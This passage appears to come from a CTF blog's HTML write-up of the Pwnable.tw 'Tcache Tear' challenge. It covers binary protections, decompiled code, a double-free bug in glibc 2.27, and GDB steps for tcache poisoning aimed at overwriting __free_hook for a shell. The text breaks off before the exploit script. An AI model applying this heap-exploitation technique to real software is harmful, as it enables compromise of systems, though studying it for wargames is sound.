@@ -1,0 +1,1508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tcache Tear | QA210 Pwnable.tw</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F9EA;</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg2: #111827;
+  --card: #151d2e;
+  --border: #1e293b;
+  --fg: #e2e8f0;
+  --muted: #94a3b8;
+  --accent: #38bdf8;
+  --accent2: #818cf8;
+  --red: #f87171;
+  --green: #4ade80;
+  --yellow: #fbbf24;
+  --orange: #fb923c;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Particle Canvas */
+#particles-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* Navigation */
+.nav {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 100;
+  background: rgba(10, 14, 23, 0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex;
+  align-items: center;
+  padding: 0 2rem;
+}
+.nav-brand {
+  font-weight: 800;
+  font-size: 1.25rem;
+  color: var(--accent);
+  letter-spacing: -0.5px;
+  text-decoration: none;
+}
+.nav-brand span { color: var(--accent2); }
+.nav-links {
+  display: flex;
+  gap: 0.25rem;
+  margin-left: 2rem;
+  list-style: none;
+}
+.nav-links a {
+  padding: 0.4rem 1rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+.nav-links a:hover { color: var(--fg); background: rgba(255,255,255,0.05); }
+.nav-links a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+}
+.nav-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+.nav-right a {
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.nav-right a:hover { color: var(--fg); }
+
+/* Breadcrumb */
+.breadcrumb {
+  position: relative;
+  z-index: 1;
+  padding: 80px 2rem 0;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.breadcrumb-inner {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8125rem;
+  color: var(--muted);
+}
+.breadcrumb-inner a {
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.breadcrumb-inner a:hover { color: var(--accent); }
+.breadcrumb-sep { opacity: 0.4; }
+.breadcrumb-current { color: var(--fg); font-weight: 600; }
+
+/* Hero Section */
+.hero {
+  position: relative;
+  z-index: 1;
+  padding: 2rem 2rem 1rem;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.35rem 1rem;
+  background: rgba(56, 189, 248, 0.1);
+  border: 1px solid rgba(56, 189, 248, 0.2);
+  border-radius: 999px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 1rem;
+}
+.hero-badge .dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+.hero h1 {
+  font-size: 2.75rem;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  margin-bottom: 0.5rem;
+  background: linear-gradient(135deg, var(--fg), var(--accent));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-subtitle {
+  font-size: 1.1rem;
+  color: var(--muted);
+  max-width: 680px;
+  margin-bottom: 1.5rem;
+}
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  margin-bottom: 1rem;
+}
+.hero-tag {
+  padding: 0.3rem 0.75rem;
+  border-radius: 6px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  font-family: 'JetBrains Mono', monospace;
+}
+.tag-pts { background: rgba(251, 191, 36, 0.15); color: var(--yellow); border: 1px solid rgba(251, 191, 36, 0.25); }
+.tag-arch { background: rgba(129, 140, 248, 0.15); color: var(--accent2); border: 1px solid rgba(129, 140, 248, 0.25); }
+.tag-vuln { background: rgba(248, 113, 113, 0.15); color: var(--red); border: 1px solid rgba(248, 113, 113, 0.25); }
+.tag-nx { background: rgba(74, 222, 128, 0.15); color: var(--green); border: 1px solid rgba(74, 222, 128, 0.25); }
+
+/* Main Layout */
+.main-layout {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1rem 2rem 4rem;
+  gap: 2rem;
+}
+
+/* TOC Sidebar */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  width: 240px;
+  flex-shrink: 0;
+  height: fit-content;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-sidebar::-webkit-scrollbar { width: 3px; }
+.toc-sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+.toc-title {
+  font-size: 0.6875rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--muted);
+  margin-bottom: 1rem;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 0.25rem; }
+.toc-list a {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.4rem 0.75rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: all 0.2s;
+  border-left: 2px solid transparent;
+}
+.toc-list a:hover { color: var(--fg); background: rgba(255,255,255,0.03); }
+.toc-list a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.08);
+  border-left-color: var(--accent);
+}
+.toc-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6875rem;
+  font-weight: 700;
+  color: var(--accent2);
+  min-width: 18px;
+}
+
+/* Content Area */
+.content-area {
+  flex: 1;
+  min-width: 0;
+  max-width: 880px;
+}
+
+/* Chapter Sections */
+.chapter {
+  margin-bottom: 3rem;
+  scroll-margin-top: 80px;
+}
+.chapter-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border);
+}
+.chapter-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+  padding: 0.35rem 0.7rem;
+  border-radius: 6px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+.chapter-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+.chapter p {
+  margin-bottom: 1rem;
+  color: var(--muted);
+  font-size: 0.9375rem;
+  line-height: 1.8;
+}
+
+.chapter h3 {
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+  color: var(--fg);
+}
+.chapter h4 {
+  font-size: 0.9375rem;
+  font-weight: 600;
+  margin: 1.25rem 0 0.5rem;
+  color: var(--fg);
+}
+
+/* Code Blocks */
+.code-block {
+  position: relative;
+  margin: 1rem 0 1.5rem;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  overflow: hidden;
+}
+.code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.5rem 1rem;
+  background: rgba(0,0,0,0.3);
+  border-bottom: 1px solid var(--border);
+  font-size: 0.75rem;
+}
+.code-lang {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.code-dots {
+  display: flex;
+  gap: 5px;
+}
+.code-dots span {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+.code-dots .d1 { background: #f87171; }
+.code-dots .d2 { background: #fbbf24; }
+.code-dots .d3 { background: #4ade80; }
+
+pre[class*="language-"] {
+  margin: 0 !important;
+  padding: 1rem 1.25rem !important;
+  background: transparent !important;
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+  line-height: 1.7 !important;
+  overflow-x: auto;
+}
+code[class*="language-"] {
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+}
+
+/* Inline Code */
+code.inline {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8125rem;
+  background: rgba(129, 140, 248, 0.12);
+  color: var(--accent2);
+  padding: 0.15rem 0.45rem;
+  border-radius: 4px;
+  font-weight: 500;
+}
+
+/* Callout Boxes */
+.callout {
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.875rem;
+  line-height: 1.7;
+  border: 1px solid;
+}
+.callout-title {
+  font-weight: 700;
+  font-size: 0.8125rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.35rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.callout-vuln {
+  background: rgba(248, 113, 113, 0.08);
+  border-color: rgba(248, 113, 113, 0.2);
+  color: #fca5a5;
+}
+.callout-vuln .callout-title { color: var(--red); }
+.callout-info {
+  background: rgba(56, 189, 248, 0.08);
+  border-color: rgba(56, 189, 248, 0.2);
+  color: #bae6fd;
+}
+.callout-info .callout-title { color: var(--accent); }
+.callout-warn {
+  background: rgba(251, 191, 36, 0.08);
+  border-color: rgba(251, 191, 36, 0.2);
+  color: #fde68a;
+}
+.callout-warn .callout-title { color: var(--yellow); }
+.callout-key {
+  background: rgba(129, 140, 248, 0.08);
+  border-color: rgba(129, 140, 248, 0.2);
+  color: #c7d2fe;
+}
+.callout-key .callout-title { color: var(--accent2); }
+.callout-success {
+  background: rgba(74, 222, 128, 0.08);
+  border-color: rgba(74, 222, 128, 0.2);
+  color: #bbf7d0;
+}
+.callout-success .callout-title { color: var(--green); }
+
+/* Tables */
+.info-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.8125rem;
+}
+.info-table th {
+  text-align: left;
+  padding: 0.6rem 1rem;
+  background: rgba(0,0,0,0.3);
+  color: var(--muted);
+  font-weight: 600;
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border-bottom: 1px solid var(--border);
+}
+.info-table td {
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+}
+.info-table tr:last-child td { border-bottom: none; }
+.info-table .label { color: var(--muted); font-family: 'Inter', sans-serif; }
+.info-table .value { color: var(--fg); }
+.info-table .on { color: var(--green); }
+.info-table .off { color: var(--red); }
+.info-table .partial { color: var(--yellow); }
+
+/* Memory Diagrams */
+.mem-diagram {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1rem 0 1.5rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+  overflow-x: auto;
+}
+.mem-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 2px;
+}
+.mem-addr {
+  color: var(--accent);
+  min-width: 100px;
+  font-weight: 600;
+}
+.mem-arrow {
+  color: var(--muted);
+  margin: 0 0.5rem;
+}
+.mem-data {
+  color: var(--fg);
+  flex: 1;
+}
+.mem-desc {
+  color: var(--muted);
+  font-style: italic;
+  margin-left: 1rem;
+  font-size: 0.75rem;
+}
+.mem-highlight { color: var(--red); font-weight: 700; }
+.mem-green { color: var(--green); font-weight: 700; }
+.mem-yellow { color: var(--yellow); font-weight: 700; }
+.mem-orange { color: var(--orange); font-weight: 700; }
+
+/* Step Lists */
+.step-list {
+  list-style: none;
+  margin: 1rem 0 1.5rem;
+  counter-reset: step;
+}
+.step-list li {
+  counter-increment: step;
+  padding: 0.6rem 0 0.6rem 2.5rem;
+  position: relative;
+  font-size: 0.9rem;
+  color: var(--muted);
+  line-height: 1.7;
+}
+.step-list li::before {
+  content: counter(step);
+  position: absolute;
+  left: 0;
+  top: 0.65rem;
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  background: rgba(129, 140, 248, 0.15);
+  color: var(--accent2);
+  font-size: 0.6875rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+}
+.step-list li strong { color: var(--fg); }
+
+/* Footer */
+.footer {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 2rem;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  font-size: 0.75rem;
+}
+.footer a { color: var(--accent); text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+
+/* Responsive */
+@media (max-width: 1024px) {
+  .toc-sidebar { display: none; }
+  .hero h1 { font-size: 2rem; }
+}
+@media (max-width: 640px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 1.5rem; }
+  .main-layout { padding: 1rem; }
+}
+
+/* ═══ FIXED NAV ADDITIONS ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+
+</style>
+</head>
+<body>
+
+<!-- Particle Canvas -->
+<canvas id="particles-canvas"></canvas>
+
+<!-- Navigation -->
+<header class="site-header">
+  <a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a>
+  <nav class="nav-main">
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+  </nav>
+</div>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <div class="breadcrumb-inner">
+    <a href="/">Home</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="/pwnable-tw/">Pwnable.tw</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">Tcache Tear</span>
+  </div>
+</div>
+
+<!-- Hero Section -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="dot"></span>
+    Pwnable.tw
+  </div>
+  <h1>Tcache Tear</h1>
+  <p class="hero-subtitle">A tcache exploitation challenge on glibc 2.27 leveraging double-free to poison tcache, forging fake chunks in BSS for unsorted bin leak, then overwriting <code class="inline">__free_hook</code> with one_gadget for shell &mdash; classic tcache attack on a No-PIE binary.</p>
+  <div class="hero-meta">
+    <span class="hero-tag tag-pts">400 pts</span>
+    <span class="hero-tag tag-arch">x86-64 (64-bit ELF)</span>
+    <span class="hero-tag tag-vuln">Double-Free (Tcache)</span>
+    <span class="hero-tag tag-nx">Full RELRO + Canary + NX + No PIE</span>
+  </div>
+</section>
+
+<!-- Main Layout -->
+<div class="main-layout">
+
+  <!-- TOC Sidebar -->
+  <aside class="toc-sidebar">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list" id="toc-list">
+      <li><a href="#ch1" class="active"><span class="toc-num">01</span> Reconnaissance</a></li>
+      <li><a href="#ch2"><span class="toc-num">02</span> Static Analysis</a></li>
+      <li><a href="#ch3"><span class="toc-num">03</span> GDB Debugging</a></li>
+      <li><a href="#ch4"><span class="toc-num">04</span> Exploit Strategy</a></li>
+      <li><a href="#ch5"><span class="toc-num">05</span> Pwn Script</a></li>
+      <li><a href="#ch6"><span class="toc-num">06</span> Execution Results</a></li>
+    </ul>
+  </aside>
+
+  <!-- Content Area -->
+  <main class="content-area">
+
+    <!-- Chapter 1: Reconnaissance -->
+    <section class="chapter" id="ch1">
+      <div class="chapter-header">
+        <span class="chapter-num">01</span>
+        <h2 class="chapter-title">Reconnaissance</h2>
+      </div>
+
+      <h3>Challenge Info</h3>
+      <table class="info-table">
+        <tr><td class="label">Connection</td><td class="value"><code class="inline">nc chall.pwnable.tw 10500</code></td></tr>
+        <tr><td class="label">Binary</td><td class="value">tcache_tear (64-bit ELF, x86-64, stripped)</td></tr>
+        <tr><td class="label">Points</td><td class="value">400</td></tr>
+        <tr><td class="label">Provided</td><td class="value">Binary + libc (Ubuntu 18.04, libc-2.27)</td></tr>
+        <tr><td class="label">Description</td><td class="value">Tcache exploitation challenge</td></tr>
+      </table>
+
+      <h3>checksec</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ checksec tcache_tear_patched
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)</code></pre>
+      </div>
+
+      <table class="info-table">
+        <tr><td class="label">Full RELRO</td><td class="on">GOT is read-only &mdash; cannot overwrite GOT entries</td></tr>
+        <tr><td class="label">Canary found</td><td class="on">Stack buffer overflows are mitigated</td></tr>
+        <tr><td class="label">NX enabled</td><td class="on">No shellcode injection &mdash; need ROP or hook overwrite</td></tr>
+        <tr><td class="label">No PIE</td><td class="off">Binary addresses are <strong>fixed</strong> &mdash; we know BSS layout at runtime!</td></tr>
+      </table>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Key Implications</div>
+        <strong>No PIE</strong> is the critical advantage here. Binary addresses like the BSS <code class="inline">NAME_BUFFER</code> at <code class="inline">0x602060</code> are fixed and known at exploit time. This lets us forge <strong>fake chunks</strong> in BSS that the heap allocator will accept. Combined with glibc 2.27's tcache (which has <strong>no double-free protection</strong> until 2.29), we have a straightforward tcache poisoning path. Our target is <code class="inline">__free_hook</code> in libc's writable data section.
+      </div>
+
+      <h3>Running the Binary</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ ./tcache_tear_patched
+Name:AAAA
+1. malloc
+2. free
+3. info
+4. exit
+&gt;&gt; 1
+Size:0x50
+Data:BBBB
+Done !
+1. malloc
+2. free
+3. info
+4. exit
+&gt;&gt; 3
+Name :AAAA
+1. malloc
+2. free
+3. info
+4. exit
+&gt;&gt; 2
+Done !
+1. malloc
+2. free
+3. info
+4. exit
+&gt;&gt; 4</code></pre>
+      </div>
+
+      <p>The binary provides a minimal heap interface: <strong>malloc</strong> (allocate with user-controlled size up to 0xFF), <strong>free</strong> (deallocate the global buffer), <strong>info</strong> (print the name buffer), and <strong>exit</strong>. There is only one global buffer pointer &mdash; each malloc overwrites the previous one.</p>
+    </section>
+
+    <!-- Chapter 2: Static Analysis -->
+    <section class="chapter" id="ch2">
+      <div class="chapter-header">
+        <span class="chapter-num">02</span>
+        <h2 class="chapter-title">Static Analysis</h2>
+      </div>
+
+      <h3>Decompiled Code (Stripped Binary)</h3>
+      <p>The binary is stripped, but after reverse engineering, we can reconstruct the following decompiled code:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">// BSS globals
+char NAME_BUFFER[0x20];   // 0x602060 - set at program start
+void *GLOBAL_BUFFER;      // 0x602088 - the single heap pointer
+
+void main() {
+    long input;
+    uint idx = 0;
+    init();
+    printf("Name:");
+    get_str_input(&amp;NAME_BUFFER, 0x20);
+
+    do {
+        menu();
+        input = get_input();
+        if (input == 2) {           // free
+            if (idx &lt; 8) {
+                free(GLOBAL_BUFFER);
+                idx++;
+            }
+        } else if (input == 1) {    // malloc
+            allocate_buffer();
+        } else if (input == 3) {    // info
+            info();
+        } else if (input == 4) {
+            exit(0);
+        }
+    } while (true);
+}
+
+void allocate_buffer() {
+    ulong __size;
+    printf("Size:");
+    __size = get_input();
+    if (__size &lt; 0x100) {
+        GLOBAL_BUFFER = malloc(__size);
+        printf("Data:");
+        get_str_input(GLOBAL_BUFFER, (int)__size - 0x10);
+        puts("Done !");
+    }
+}
+
+void info() {
+    printf("Name :");
+    write(1, &amp;NAME_BUFFER, 0x20);
+}</code></pre>
+      </div>
+
+      <h3>BSS Layout</h3>
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">BSS Section (No PIE &mdash; fixed addresses)</div>
+        <div class="mem-row"><span class="mem-addr">0x602060</span><span class="mem-arrow">|</span><span class="mem-data">NAME_BUFFER[0x20]</span><span class="mem-desc">&larr; 32 bytes, set at startup, readable via info()</span></div>
+        <div class="mem-row"><span class="mem-addr">0x602080</span><span class="mem-arrow">|</span><span class="mem-data">[padding / unused]</span></div>
+        <div class="mem-row"><span class="mem-addr">0x602088</span><span class="mem-arrow">|</span><span class="mem-data">GLOBAL_BUFFER ptr</span><span class="mem-desc">&larr; 8 bytes, the single heap chunk pointer</span></div>
+        <div style="height:8px"></div>
+        <div class="mem-row"><span class="mem-desc">NAME_BUFFER spans 0x602060&ndash;0x60207F, giving us 0x420+ bytes of controlled BSS after it</span></div>
+        <div class="mem-row"><span class="mem-desc">We can forge <span class="mem-highlight">fake heap chunks</span> in this BSS region!</span></div>
+      </div>
+
+      <h3>Vulnerability Analysis</h3>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability: Double-Free in Tcache</div>
+        The <code class="inline">free</code> operation frees <code class="inline">GLOBAL_BUFFER</code> but <strong>does NOT NULL out the pointer</strong>. The only guard is <code class="inline">if (idx &lt; 8)</code>, which limits total frees to 8 &mdash; but this does <strong>not</strong> prevent freeing the same chunk twice! In glibc 2.27, tcache has <strong>no double-free detection</strong> (the <code class="inline">tcache_key</code> check was added in 2.29). This means:<br>
+        &bull; We can call <code class="inline">free()</code> on the same chunk consecutively<br>
+        &bull; The tcache freelist becomes: <code class="inline">chunk &rarr; chunk</code> (self-referencing cycle)<br>
+        &bull; We can then allocate from tcache, overwrite the FD pointer, and achieve <strong>tcache poisoning</strong><br>
+        &bull; This lets us allocate at <strong>any address</strong> we choose
+      </div>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Constraint: Size &lt; 0x100</div>
+        The <code class="inline">allocate_buffer</code> function enforces <code class="inline">__size &lt; 0x100</code>, limiting us to tcache-sized chunks (up to 0xF0 usable = 0x100 chunk with header). We cannot directly create unsorted-bin-sized chunks through <code class="inline">malloc</code>. However, we can still get chunks into the unsorted bin by forging a <strong>fake large chunk</strong> in BSS and freeing it via tcache poisoning.
+      </div>
+
+      <h3>info() &mdash; The Leak Primitive</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void info() {
+    printf("Name :");
+    write(1, &amp;NAME_BUFFER, 0x20);
+}</code></pre>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Key Observation: Arbitrary Read via BSS Overlap</div>
+        The <code class="inline">info()</code> function calls <code class="inline">write(1, &amp;NAME_BUFFER, 0x20)</code> &mdash; it dumps exactly 0x20 bytes starting from <code class="inline">NAME_BUFFER</code> at <code class="inline">0x602060</code>. Since we can use tcache poisoning to allocate a chunk overlapping BSS, we can write a <strong>pointer to a libc address</strong> into <code class="inline">NAME_BUFFER</code>, then call <code class="inline">info()</code> to read it. Even better: if we place a fake chunk in BSS whose data overlaps with <code class="inline">NAME_BUFFER</code>, we can read the FD/BK pointers left by the unsorted bin after freeing that fake chunk.
+      </div>
+    </section>
+
+    <!-- Chapter 3: GDB Debugging -->
+    <section class="chapter" id="ch3">
+      <div class="chapter-header">
+        <span class="chapter-num">03</span>
+        <h2 class="chapter-title">GDB Debugging</h2>
+      </div>
+
+      <h3>Step 1: Tcache Double-Free Demonstration</h3>
+      <p>Let's allocate a 0x50-sized chunk and free it twice:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # malloc(0x50, "A"*8)
+gdb-peda$ # free()  -> first free into tcache[5] (0x50 bin)
+gdb-peda$ # free()  -> DOUBLE FREE! Same chunk goes in again!
+gdb-peda$ tcachebins
+(0x50)   tcache_entry[5]: 0x555555758260 &rarr; 0x555555758260 (cycle!)
+# The tcache freelist now has the same chunk pointing to itself!</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Why This Works in glibc 2.27</div>
+        In glibc 2.27, the tcache <code class="inline">tcache_put()</code> function has <strong>no security checks</strong> at all &mdash; it doesn't verify whether the chunk is already in the tcache. The double-free protection (<code class="inline">tcache_key</code>) was only introduced in glibc 2.29. This makes tcache double-free trivial on 2.27: just call <code class="inline">free()</code> twice on the same pointer.
+      </div>
+
+      <h3>Step 2: Tcache Poisoning &mdash; Overwriting FD</h3>
+      <p>After the double-free, we allocate from the tcache and overwrite the next pointer:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # After double-free: tcache[5] = chunk -> chunk
+gdb-peda$ # malloc(0x50, p64(TARGET_ADDR))  -> pops chunk, writes TARGET_ADDR to FD
+gdb-peda$ # Now tcache[5] = chunk -> TARGET_ADDR
+gdb-peda$ # malloc(0x50, "B"*8)  -> pops chunk again (gets the same one)
+gdb-peda$ # malloc(0x50, data)   -> pops TARGET_ADDR! We get allocation at TARGET_ADDR
+gdb-peda$ tcachebins
+(0x50)   tcache_entry[5]: 0x555555758260 &rarr; 0x602060 (NAME_BUFFER!)</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">Tcache Poisoning Flow</div>
